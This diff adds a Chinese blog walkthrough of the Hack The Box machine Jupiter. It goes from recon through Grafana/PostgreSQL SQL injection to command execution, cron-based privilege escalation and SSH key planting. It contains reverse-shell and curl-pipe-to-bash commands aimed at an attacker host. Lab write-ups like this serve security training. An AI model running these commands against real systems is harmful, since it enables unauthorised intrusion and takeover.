@@ -209,8 +209,18 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2023-11-06 04:14:21" itemprop="dateCreated datePublished" datetime="2023-11-06T04:14:21+08:00">2023-11-06</time>
+              <time title="创建时间：2023-11-06 04:14:21 / 修改时间：04:35:11" itemprop="dateCreated datePublished" datetime="2023-11-06T04:14:21+08:00">2023-11-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%89%93%E9%9D%B6/" itemprop="url" rel="index"><span itemprop="name">打靶</span></a>
+                </span>
             </span>
 
           <br>
@@ -219,14 +229,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>0</span>
+              <span>1.8k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>6 分钟</span>
             </span>
 
         </div>
@@ -238,7 +248,105 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          
+          <p>声明：本篇文章作者YDJA，本文属i春秋原创奖励计划，未经许可禁止转载。</p>
+<h1 id="外网信息收集"><a href="#外网信息收集" class="headerlink" title="外网信息收集"></a>外网信息收集</h1><h3 id="端口扫描（nmap）"><a href="#端口扫描（nmap）" class="headerlink" title="端口扫描（nmap）"></a>端口扫描（nmap）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 10.10.11.216</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418381-147.png" alt="img"></p>
+<p>开放了80和22端口，22端口的SSH服务在不知道账户密码的情况下还是比较难利用的，所以我们先重点关注80端口的web服务（需将跳转的域名添加到host文件）</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-148.png" alt="img"></p>
+<h3 id="子域名爆破（gobuster）"><a href="#子域名爆破（gobuster）" class="headerlink" title="子域名爆破（gobuster）"></a>子域名爆破（gobuster）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u http://jupiter.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-149.png" alt="img"></p>
+<p>发现了一个存活子域kiosk.jupiter.htb，先添加到host文件</p>
+<h3 id="指纹识别（whatweb）"><a href="#指纹识别（whatweb）" class="headerlink" title="指纹识别（whatweb）"></a>指纹识别（whatweb）</h3><p>我们对现有的资产做一个指纹识别</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://jupiter.htb</span><br><span class="line">http://kiosk.jupiter.htb</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-150.png" alt="img"></p>
+<p>（信息收集这里我只演示了比较基础的三个操作，其实大家都知道渗透测试的关键在于信息收集，所以这一块在时间允许的范围内肯定是做的越多越好，而且在涉及到需要爆破的操作时，字典当然也是越大越好）</p>
+<h1 id="Web打点"><a href="#Web打点" class="headerlink" title="Web打点"></a>Web打点</h1><p>对于整理出来的资产信息，红队人员一般都会选择薄弱的资产入手，而薄弱资产一般指的是网站使用了一些存在历史漏洞的通用应用组件、CMS、OA系统等，也就是我们常说的1day、nday。（这里抛开0day这种核武器不谈）</p>
+<h3 id="Grafana"><a href="#Grafana" class="headerlink" title="Grafana"></a>Grafana</h3><p>回到我们的目标，通过指纹识别我们可以看到主站都是一些很常见的指纹，暂时没有发现可以进一步利用的地方，而在子域kiosk.jupiter.htb我们发现了一个特殊的指纹Grafana，版本是9.5.2</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-151.png" alt="img"></p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-152.png" alt="img"></p>
+<p>先问一手gpt，了解一下这个应用服务</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-153.png" alt="img"></p>
+<p>然后根据版本去找它的历史漏洞，由于靶场的目的是获取权限，所以我们需要重点关注一些信息泄露（找到账号密码直接ssh登录）、sql注入（也是为了rce或者拿到账户密码）或者是直接RCE的洞</p>
+<p>所以确定了范围之后找到了一个sql注入的文章<a target="_blank" rel="noopener" href="https://community.grafana.com/t/sql-injection-in-api-tsdb-query-in-grafana/29713">https://community.grafana.com/t/sql-injection-in-api-tsdb-query-in-grafana/29713</a></p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-154.png" alt="img"></p>
+<p>入口是一个查询数据库的接口，我们通过burp对目标抓包，也可以看到一样的接口</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-155.png" alt="img"></p>
+<p>通过观察请求体内容我们可以看到使用的是PostgresSQL数据库</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-156.png" alt="img"></p>
+<h3 id="PostgresSQL注入到RCE"><a href="#PostgresSQL注入到RCE" class="headerlink" title="PostgresSQL注入到RCE"></a>PostgresSQL注入到RCE</h3><p>所以我们直接去搜索该数据库的注入方式，找到了一篇比较详细的文章<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/249371.html">https://www.freebuf.com/articles/web/249371.html</a></p>
+<p>我们先来验证一下</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-157.png" alt="img"></p>
+<p>可以看到，成功查询到了版本号</p>
+<p>而有趣的是，我在查找的过程中发现了PostgresSQL数据库存在一个可以直接RCE的历史漏洞**[CVE-2019–9193]**，要是可以成功利用那我们就可以省去在数据库翻找的时间了，我们根据网上找到的文章进行复现<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1472565">https://cloud.tencent.com/developer/article/1472565</a></p>
+<p>先依次执行以下四个语句（最终会执行”id“系统命令并返回结果）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS cmd_exec;1</span><br><span class="line">CREATE TABLE cmd_exec(cmd_output text);</span><br><span class="line">COPY cmd_exec FROM PROGRAM <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">SELECT * FROM cmd_exec;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-158.png" alt="img"></p>
+<p>可以看到，执行完最后一条指令后，成功返回执行结果</p>
+<p>那么接下来就好办了，我们将”id“改为反弹shell的命令”&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.50&#x2F;4444 0&gt;&amp;1“，就可以拿到用户系统的shell了</p>
+<p>重新执行一遍语句，在写入命令的时候，报错了</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-159.png" alt="img"></p>
+<p>可能是特殊字符的问题，所以我们在本地写一个sh脚本，然后让目标通过curl下载执行就可以了</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-160.png" alt="img"></p>
+<p>起一个http服务</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-161.png" alt="img"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">替换为以下命令：</span><br><span class="line">curl http://10.10.14.50:5555/shell.sh|bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-162.png" alt="img"></p>
+<p>发完出这个数据包，监听端口就接到了反弹shell</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-163.png" alt="img"></p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>可以发现在home目录下有两个用户目录，所以想要拿到flag，还需要提权</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-164.png" alt="img"></p>
+<h3 id="postgres用户—-juno用户"><a href="#postgres用户—-juno用户" class="headerlink" title="postgres用户—&gt;juno用户"></a>postgres用户—&gt;juno用户</h3><h5 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h5><p>主机信息收集我一般都是直接上linpeas和pspy配合着来，当然也可以用其他的工具</p>
+<p>同样通过本地的http服务让目标通过wget下载好两个工具，chmod给执行权限，分别运行</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-165.png" alt="img"></p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-166.png" alt="img"></p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-167.png" alt="img"></p>
+<p>在linpeas中暂时没有发现能利用的点，而在pspy中，可以看到用户juno（uid&#x3D;1000）在有规律的执行一些命令，猜测可能是定时任务</p>
+<p>（注：如果系统不存在通用的提权漏洞，那我们就可以想办法借助目标用户的定时任务，通过修改文件等操作，让用户的定时任务执行时带上我们的恶意命令，以达到修改权限的目的）</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-168.png" alt="img"></p>
+<h5 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h5><p>我们借助gpt来帮助我们分析一下</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-169.png" alt="img"></p>
+<p>而所涉及文件中我们只能查看shadow命令执行的&#x2F;dev&#x2F;shm&#x2F;network-simulation.yml这个文件</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-170.png" alt="img"></p>
+<p>同样拿去gpt分析</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-171.png" alt="img"></p>
+<p>大概意思是是一个启动web服务模拟网络通信的脚本，而且在path和arg处可以执行带参数的命令，如果能改成chmod u+s &#x2F;bin&#x2F;bash，就可以成功借助定时任务提权</p>
+<p>所以我想直接修改一个path，然后上传覆盖掉原本的yaml脚本</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-172.png" alt="img"></p>
+<p>而我在pspy64上看到它并没有执行成功，只执行了上面的python命令</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-173.png" alt="img"></p>
+<p>所以得换一个思路</p>
+<p>这里也是通过查看大佬的思路发现可以利用cp命令将&#x2F;bin&#x2F;bash移出来（其实我不也太理解为啥直接操作&#x2F;bin&#x2F;bash不行）</p>
+<p>改完后是这样的</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-174.png" alt="img"></p>
+<p>上传覆盖，然后pspy64观察进程</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-175.png" alt="img"></p>
+<p>两个都成功执行了</p>
+<p>然后执行命令提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/bash -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-176.png" alt="img"></p>
+<p>可以看到，成功提权进入&#x2F;home&#x2F;juno（postpres用户进不去），但是还是没有访问flag的权限，所以我们得想办法通过ssh进去才行，这里我们有了进入&#x2F;home&#x2F;juno目录的权限，可以尝试ssh公钥写入</p>
+<h5 id="ssh公钥写入"><a href="#ssh公钥写入" class="headerlink" title="ssh公钥写入"></a>ssh公钥写入</h5><p>先在本地生成公私钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f ydj</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-177.png" alt="img"></p>
+<p>回到目标，用python的pty生成一个好看一点的shell，然后重新执行一遍&#x2F;tmp&#x2F;bash -p命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-178.png" alt="img"></p>
+<p>从本地下载公钥，cp到.ssh&#x2F;authorized_keys</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-179.png" alt="img"></p>
+<p>然后本地ssh私钥连接</p>
+<p><img src="/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418383-180.png" alt="img"></p>
+<p>成功登录拿到flag</p>
+<p>（篇幅有限，后面的juno—&gt;jovian，jovian—&gt;root就先不讲了，也不是今天的重点）</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总的来说，红队的攻击手法还是数不胜数的，但是终究离不开三板斧：信息收集、外网打点、内网横向。（该HTB靶场没有内网环境，就不做内网横向演示了）所以我们可以以这三个点为基础，然后不断扩展自己的知识面，争取早日成为一个可以独当一面的红队大佬！！！</p>
+
       
     </div>
 
@@ -514,13 +622,13 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -560,12 +668,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">4k</span>
+    <span title="站点总字数">6k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">14 分钟</span>
+    <span title="站点阅读时长">20 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
